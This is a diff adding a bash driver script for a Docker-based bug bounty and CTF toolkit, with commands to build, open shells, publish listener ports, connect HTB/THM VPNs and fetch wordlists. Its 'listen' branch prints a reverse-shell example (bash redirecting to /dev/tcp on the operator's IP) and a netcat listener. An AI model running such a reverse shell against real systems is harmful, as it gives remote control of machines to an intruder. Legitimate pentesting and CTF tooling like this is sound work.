@@ -1,0 +1,104 @@
+#!/usr/bin/env bash
+# deck - driver for the toolkit. Thin wrapper over docker compose.
+set -euo pipefail
+
+cd "$(dirname "${BASH_SOURCE[0]}")"
+
+DC=(docker compose)
+
+# Every session is a throwaway container against the same volumes.
+dcrun() { "${DC[@]}" run --rm deck "$@"; }
+
+usage() {
+  cat <<'EOF'
+deck - driver for icepick-offsec, a bug bounty & CTF toolkit
+
+  ./deck build              build the image
+  ./deck shell              interactive shell
+  ./deck listen [ports...]  shell with listener ports published to the LAN
+  ./deck vpn <file.ovpn>    connect an HTB/THM VPN, then drop into a shell
+  ./deck run <cmd...>       one-shot command, no shell
+  ./deck wordlists          populate the shared wordlists volume (once)
+  ./deck status             running containers
+  ./deck stop               stop everything
+  ./deck clean [--volumes]  remove containers (and optionally all data volumes)
+
+Inside the container:
+  whereami        user, capabilities, egress
+  lockdown-lan    block RFC1918 egress, keep the public internet
+EOF
+}
+
+mkdir -p workspace
+
+case "${1:-}" in
+  build) "${DC[@]}" build ;;
+
+  # With no trailing args this drops you in a shell; with args it runs the
+  # command and exits. `run` is the same thing, named for when that is the intent.
+  shell) shift; dcrun "$@" ;;
+
+  # A normal container publishes nothing, so a listener inside binds to the
+  # private bridge IP nothing off-host can reach. `listen` publishes ports so a
+  # LAN target can call back - aim its payload at the host's IP below, not the
+  # container's. (For HTB/THM use `deck vpn`: tun0 is already routable.)
+  listen)
+    shift
+    ports=("$@")
+    [ ${#ports[@]} -eq 0 ] && ports=(4444 8000 9001 443)
+    pub=()
+    for p in "${ports[@]}"; do pub+=(-p "${p}:${p}"); done
+
+    iface=$(route get default 2>/dev/null | awk '/interface:/{print $2}')
+    lan=$(ipconfig getifaddr "${iface:-en0}" 2>/dev/null || echo '<your-LAN-IP>')
+
+    echo "listener ports published on the host : ${ports[*]}"
+    echo "callback address for LAN targets     : $lan"
+    echo "  e.g.  nc -lvnp 4444"
+    echo "        target> bash -i >& /dev/tcp/$lan/4444 0>&1"
+    echo "these ports are open to your whole LAN until you exit the shell."
+    echo
+    "${DC[@]}" run --rm "${pub[@]}" deck
+    ;;
+
+  # Stage the .ovpn into workspace (the only bind mount; *.ovpn is gitignored),
+  # then hand off to vpn-connect in-container. The filename travels as an env var
+  # so an odd name can't break anything. Same container = same netns, so the
+  # tunnel is live in the shell vpn-connect drops you into.
+  vpn)
+    shift
+    cfg="${1:-}"
+    [ -n "$cfg" ] || { echo "usage: ./deck vpn <file.ovpn>" >&2; exit 1; }
+    [ -f "$cfg" ] || { echo "no such file: $cfg" >&2; exit 1; }
+    base="$(basename "$cfg")"
+    [ "$cfg" -ef "workspace/$base" ] || cp "$cfg" "workspace/$base"
+    echo "connecting via $base - exit the shell to disconnect"
+    "${DC[@]}" run --rm -e OVPN="$base" deck vpn-connect
+    ;;
+
+  run)
+    shift
+    [ $# -gt 0 ] || { echo "run what?" >&2; exit 1; }
+    dcrun "$@"
+    ;;
+
+  wordlists) dcrun fetch-wordlists ;;
+
+  status) "${DC[@]}" ps -a ;;
+  stop)   "${DC[@]}" down ;;
+
+  clean)
+    if [ "${2:-}" = "--volumes" ]; then
+      echo "This deletes the wordlists and tool-config volumes."
+      echo "workspace/ on the host is untouched."
+      read -r -p "continue? [y/N] " a
+      [ "$a" = "y" ] || exit 0
+      "${DC[@]}" down -v
+    else
+      "${DC[@]}" down
+    fi
+    ;;
+
+  ""|-h|--help|help) usage ;;
+  *) echo "unknown command: $1" >&2; echo; usage; exit 1 ;;
+esac
